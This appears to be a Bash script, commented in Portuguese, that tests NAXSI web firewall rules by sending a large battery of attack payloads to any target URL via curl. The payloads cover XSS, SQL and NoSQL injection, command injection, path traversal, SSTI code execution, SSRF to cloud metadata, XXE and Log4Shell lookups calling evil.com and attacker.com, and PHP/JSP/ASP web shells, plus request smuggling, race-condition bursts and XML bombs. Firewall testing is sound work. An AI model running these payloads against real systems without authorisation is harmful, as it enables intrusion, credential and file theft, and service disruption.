#!/bin/bash

# Altere apenas esta URL
TARGET_URL="coloque_a_url_aqui"

echo "🛡️ Iniciando ataques contra: $TARGET_URL"
echo "----------------------------------------"

function attack() {
  echo -e "\n⚔️ [$1]"
  echo "Payload: $2"
  curl -s -o /dev/null -w "→ Status: %{http_code}\n" -X $3 "$TARGET_URL$4" -H "$5" --data "$2"
}

# ============= NAXSI SPECIFIC RULES =============
echo -e "\n🔒 === NAXSI SPECIFIC RULE TESTS ==="
attack "ID:1 - Weird request (não pode ser parseado)" $'\xFF\xFF\xFF' "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:2 - Request muito grande (força flush para disco)" "$(head -c 500000 /dev/urandom | base64)" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:10 - Null byte e encoding inválido" "campo=test%00test" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:11 - Content-Type desconhecido" "campo=x" "POST" "" "Content-Type: application/evil"
attack "ID:12 - URL inválida (sem encoding correto)" "" "GET" "/%ZZ" ""
attack "ID:13 - POST mal formatado" $'------bad\r\nContent-Disposition: form-data; name="campo"\r\n\r\nvalor' "POST" "" "Content-Type: multipart/form-data; boundary=bad"
attack "ID:14 - Boundary inválido no POST" "campo=x" "POST" "" "Content-Type: multipart/form-data; boundary="
attack "ID:15 - JSON inválido" '{"campo": "valor",}' "POST" "" "Content-Type: application/json"
attack "ID:16 - POST vazio" "" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:17 - libinjection_sql" "campo=' OR 1=1 --" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:18 - libinjection_xss" "campo=<script>alert(1)</script>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:19 - Sem regras genéricas (normalmente não dispara)" "campo=normal_test" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:20 - UTF-8 mal formado" $'campo=\xC0\xAF' "POST" "" "Content-Type: application/x-www-form-urlencoded"

# ============= XSS (Cross-Site Scripting) =============
echo -e "\n🔥 === XSS ATTACKS ==="
attack "ID:1302 - XSS script tag" "campo=<script>alert('xss')</script>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS encoded script tag" "campo=%3Cscript%3Ealert('xss')%3C%2Fscript%3E" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS script in query param" "" "GET" "?campo=<script>alert('xss')</script>" ""
attack "ID:1302 - XSS in header (Cookie)" "" "GET" "" "Cookie: campo=<script>alert('xss')</script>"
attack "ID:1302 - XSS img onerror" "campo=<img src=x onerror=alert(1)>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS body tag" "campo=<body onload=alert('xss')>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS svg tag" "campo=<svg/onload=alert(1)>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS javascript URI" "campo=javascript:alert(1)" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS base64 payload" "campo=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS hex encoded" "campo=\\x3cscript\\x3ealert(1)\\x3c/script\\x3e" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS iframe src" "campo=<iframe src=javascript:alert(1)></iframe>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS input onfocus" "campo=<input onfocus=alert(1) autofocus>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS details ontoggle" "campo=<details ontoggle=alert(1) open>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS marquee onstart" "campo=<marquee onstart=alert(1)>test</marquee>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS video onerror" "campo=<video onerror=alert(1)><source></video>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS audio onerror" "campo=<audio src=x onerror=alert(1)>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS form action javascript" "campo=<form action=javascript:alert(1)><input type=submit></form>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS meta refresh" "campo=<meta http-equiv=refresh content=0;url=javascript:alert(1)>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - XSS link href javascript" "campo=<link rel=stylesheet href=javascript:alert(1)>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1303 - XSS style expression" "campo=<div style=background:url(javascript:alert(1))>" "POST" "" "Content-Type: application/x-www-form-urlencoded"

# ============= SQL Injection =============
echo -e "\n💉 === SQL INJECTION ATTACKS ==="
attack "ID:1000 - SQLi tautologia clássica" "campo=1' OR '1'='1" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SQLi UNION SELECT" "campo=UNION SELECT NULL,NULL,NULL" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SQLi sleep (blind)" "campo=1 OR SLEEP(5)" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1001 - SQLi encoded" "campo=%271%20OR%20%271%27%3D%271" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1003 - SQLi comment bypass" "campo=1'/**/OR/**/'1'='1" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SQLi stacked queries (MySQL)" "campo=1; DROP TABLE users" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SQLi boolean blind" "campo=1' AND (SELECT SUBSTRING(@@version,1,1))='5'--" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SQLi time-based blind" "campo=1' AND IF(1=1,SLEEP(5),0)--" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SQLi error-based" "campo=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SQLi double query" "campo=1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))--" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SQLi UNION file read" "campo=1' UNION SELECT LOAD_FILE('/etc/passwd')--" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SQLi PostgreSQL version" "campo=1' UNION SELECT version()--" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SQLi Oracle version" "campo=1' UNION SELECT banner FROM v\$version--" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SQLi MSSQL version" "campo=1' UNION SELECT @@version--" "POST" "" "Content-Type: application/x-www-form-urlencoded"

# ============= NoSQL Injection =============
echo -e "\n🍃 === NoSQL INJECTION ATTACKS ==="
attack "ID:1000 - NoSQL MongoDB tautology" "campo={\$ne: null}" "POST" "" "Content-Type: application/json"
attack "ID:1000 - NoSQL MongoDB regex" "campo={\$regex: '.*'}" "POST" "" "Content-Type: application/json"
attack "ID:1000 - NoSQL MongoDB where" "campo={\$where: 'this.username == this.password'}" "POST" "" "Content-Type: application/json"
attack "ID:1000 - NoSQL MongoDB gt" "campo={\$gt: ''}" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1200 - NoSQL CouchDB all docs" "campo=/_all_docs" "GET" "" ""
attack "ID:1000 - NoSQL Redis command" "campo=*\\r\\nFLUSHALL\\r\\n*" "POST" "" "Content-Type: application/x-www-form-urlencoded"

# ============= Command Injection =============
echo -e "\n💻 === COMMAND INJECTION ATTACKS ==="
attack "ID:1005 - Command Injection pipe" "campo=ls|whoami" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1314 - Command Injection backtick" "campo=\`id\`" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1005 - Command Injection \$() subshell" "campo=\$(uname -a)" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1008 - Command Injection ; &&" "campo=cat /etc/passwd; echo done" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1005 - Command Injection || operator" "campo=false || whoami" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1005 - Command Injection & background" "campo=sleep 10 &" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1005 - Command Injection newline" "campo=test%0Awhoami" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1005 - Command Injection Windows" "campo=test & dir" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1008 - Command Injection PowerShell" "campo=test; Get-Process" "POST" "" "Content-Type: application/x-www-form-urlencoded"

# ============= LDAP Injection =============
echo -e "\n🔍 === LDAP INJECTION ATTACKS ==="
attack "ID:1000 - LDAP wildcard bypass" "campo=*" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - LDAP tautology" "campo=*)(&(objectClass=*" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - LDAP blind injection" "campo=*)(uid=*))(|(uid=*" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - LDAP attribute enumeration" "campo=*)(|(cn=*" "POST" "" "Content-Type: application/x-www-form-urlencoded"

# ============= LFI / Path Traversal =============
echo -e "\n📁 === LFI / PATH TRAVERSAL ATTACKS ==="
attack "ID:1200 - LFI etc/passwd" "campo=../../../../etc/passwd" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1200 - LFI encoded" "campo=..%2F..%2F..%2Fetc%2Fpasswd" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1200 - LFI double encoded" "campo=..%252F..%252F..%252Fetc%252Fpasswd" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1200 - LFI Windows system32" "campo=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1200 - LFI null byte" "campo=../../../../etc/passwd%00.txt" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1103 - LFI PHP wrapper" "campo=php://filter/read=convert.base64-encode/resource=/etc/passwd" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1106 - LFI data wrapper" "campo=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1103 - LFI expect wrapper" "campo=expect://whoami" "POST" "" "Content-Type: application/x-www-form-urlencoded"

# ============= SSTI (Server-Side Template Injection) =============
echo -e "\n🎭 === SSTI ATTACKS ==="
attack "ID:1000 - SSTI Jinja2 basic" "campo={{7*7}}" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SSTI Jinja2 config" "campo={{config}}" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SSTI Jinja2 RCE" "campo={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SSTI Twig basic" "campo={{7*7}}" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SSTI Smarty basic" "campo={7*7}" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SSTI Freemarker" "campo=\${7*7}" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - SSTI Velocity" "campo=#set(\$x=7*7)\$x" "POST" "" "Content-Type: application/x-www-form-urlencoded"

# ============= SSRF (Server-Side Request Forgery) =============
echo -e "\n🌐 === SSRF ATTACKS ==="
attack "ID:1100 - SSRF localhost" "campo=http://localhost:80" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1100 - SSRF 127.0.0.1" "campo=http://127.0.0.1:22" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1100 - SSRF internal IP" "campo=http://192.168.1.1" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1100 - SSRF metadata service" "campo=http://169.254.169.254/latest/meta-data/" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1109 - SSRF file protocol" "campo=file:///etc/passwd" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1100 - SSRF gopher protocol" "campo=gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0A%0A" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1100 - SSRF dict protocol" "campo=dict://127.0.0.1:80/" "POST" "" "Content-Type: application/x-www-form-urlencoded"

# ============= XXE (XML External Entity) =============
echo -e "\n📄 === XXE ATTACKS ==="
attack "ID:1000 - XXE basic file read" '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' "POST" "" "Content-Type: application/xml"
attack "ID:1000 - XXE parameter entity" '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root></root>' "POST" "" "Content-Type: application/xml"
attack "ID:1100 - XXE blind OOB" '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><root></root>' "POST" "" "Content-Type: application/xml"
attack "ID:1000 - XXE billion laughs" '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>' "POST" "" "Content-Type: application/xml"

# ============= File Upload Attacks =============
echo -e "\n📤 === FILE UPLOAD ATTACKS ==="
attack "ID:1000 - File Upload PHP shell" "<?php system(\$_GET['cmd']); ?>" "POST" "" "Content-Type: multipart/form-data"
attack "ID:1000 - File Upload JSP shell" "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>" "POST" "" "Content-Type: multipart/form-data"
attack "ID:1000 - File Upload ASP shell" "<%eval request(\"cmd\")%>" "POST" "" "Content-Type: multipart/form-data"
attack "ID:1000 - File Upload double extension" "shell.php.jpg" "POST" "" "Content-Type: multipart/form-data"
attack "ID:1000 - File Upload null byte" "shell.php%00.jpg" "POST" "" "Content-Type: multipart/form-data"

# ============= HTTP Header Injection =============
echo -e "\n📋 === HTTP HEADER INJECTION ATTACKS ==="
attack "ID:1000 - Header Injection CRLF" "campo=value%0D%0AInjected-Header: yes" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - Header Injection Response Splitting" "campo=value%0D%0AContent-Length: 0%0D%0A%0D%0AHTTP/1.1 200 OK%0D%0A" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - Header Injection XSS via Location" "" "GET" "" "X-Forwarded-Host: evil.com<script>alert(1)</script>"
attack "ID:1000 - Header Injection Host header" "" "GET" "" "Host: evil.com"

# ============= Authentication Bypass =============
echo -e "\n🔐 === AUTHENTICATION BYPASS ATTACKS ==="
attack "ID:1000 - Auth Bypass SQL injection" "username=admin'--&password=anything" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - Auth Bypass NoSQL injection" "username[\$ne]=1&password[\$ne]=1" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - Auth Bypass LDAP injection" "username=*)(uid=*))(|(uid=*&password=*" "POST" "" "Content-Type: application/x-www-form-urlencoded"

# ============= Deserialization Attacks =============
echo -e "\n🔄 === DESERIALIZATION ATTACKS ==="
attack "ID:1000 - Deserial Java gadget" "campo=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABYXQAAWJ4" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - Deserial PHP object" "campo=O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - Deserial Python pickle" "campo=cos\nsystem\n(S'whoami'\ntR." "POST" "" "Content-Type: application/x-www-form-urlencoded"

# ============= Log4Shell & JNDI =============
echo -e "\n🪵 === LOG4SHELL & JNDI ATTACKS ==="
attack "ID:1199 - Log4Shell basic" "campo=\${jndi:ldap://evil.com/a}" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1199 - Log4Shell obfuscated" "campo=\${jndi:\${lower:l}\${lower:d}ap://evil.com/a}" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1199 - Log4Shell RMI" "campo=\${jndi:rmi://evil.com/a}" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1199 - Log4Shell DNS" "campo=\${jndi:dns://evil.com/a}" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1199 - Log4Shell in User-Agent" "" "GET" "" "User-Agent: \${jndi:ldap://evil.com/a}"

# ============= HTTP Request Smuggling =============
echo -e "\n🚢 === HTTP REQUEST SMUGGLING ==="
attack "ID:1000 - Smuggling CL.TE" "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: vulnerable.com\r\n\r\n" "POST" "" "Content-Length: 44"
attack "ID:1000 - Smuggling TE.CL" "5\r\nGET /\r\n0\r\n\r\n" "POST" "" "Transfer-Encoding: chunked"

# ============= Race Condition =============
echo -e "\n🏃 === RACE CONDITION ATTACKS ==="
for i in {1..10}; do
  attack "ID:1000 - Race Condition attempt $i" "campo=transfer&amount=1000000&to=attacker" "POST" "" "Content-Type: application/x-www-form-urlencoded" &
done
wait

# ============= Prototype Pollution =============
echo -e "\n🔬 === PROTOTYPE POLLUTION ATTACKS ==="
attack "ID:1000 - Prototype Pollution __proto__" "campo[__proto__][isAdmin]=true" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - Prototype Pollution constructor" "campo[constructor][prototype][isAdmin]=true" "POST" "" "Content-Type: application/x-www-form-urlencoded"

# ============= GraphQL Injection =============
echo -e "\n📊 === GRAPHQL INJECTION ATTACKS ==="
attack "ID:1000 - GraphQL introspection" "query={__schema{types{name}}}" "POST" "" "Content-Type: application/json"
attack "ID:1000 - GraphQL mutation" "mutation={createUser(input:{username:\"admin\",password:\"hacked\"})}" "POST" "" "Content-Type: application/json"

# ============= Miscellaneous Attacks =============
echo -e "\n🎯 === MISCELLANEOUS ATTACKS ==="
attack "ID:1302 - JSON script injection" '{"campo":"<script>alert(1)</script>"}' "POST" "" "Content-Type: application/json"
attack "ID:1302 - Base64 script encoded" "campo=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - Obfuscated script tag" "campo=<scr<script>ipt>alert(1)</scr</script>ipt>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1302 - Payload in Referer header" "" "GET" "" "Referer: <script>alert(1)</script>"
attack "ID:1302 - Unicode normalization" "campo=\u003cscript\u003ealert(1)\u003c/script\u003e" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - CSV injection" "campo==cmd|'/c calc'!A0" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - Email header injection" "campo=test@test.com%0ABcc: everyone@company.com" "POST" "" "Content-Type: application/x-www-form-urlencoded"
attack "ID:1000 - XML bomb" '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>' "POST" "" "Content-Type: application/xml"

echo -e "\n✅ Ataques finalizados!"
echo "📊 Total de ataques executados: $(grep -c "attack \"" $0)"
